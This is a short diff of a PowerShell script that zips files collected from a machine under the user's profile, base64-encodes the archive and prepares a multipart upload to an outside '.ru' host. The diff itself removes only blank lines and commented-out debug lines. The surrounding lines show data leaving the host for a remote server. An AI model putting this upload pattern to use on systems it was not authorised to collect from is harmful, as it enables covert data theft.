@@ -56,12 +56,8 @@ echo "UPLOADING FILES... `n"
 
 $FilePath = "$ENV:UserProfile\TMP\$myFQDN.zip";
 $URL = 'https://data.secure-x.ru';
-
 $fileBytes = [System.IO.File]::ReadAllBytes($FilePath);
-##$content = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileBytes));
 $content = [Convert]::ToBase64String($fileBytes);
-##write-host "Encoded String:" $content;
-
 $boundary = [System.Guid]::NewGuid().ToString(); 
 $LF = "`r`n";
 
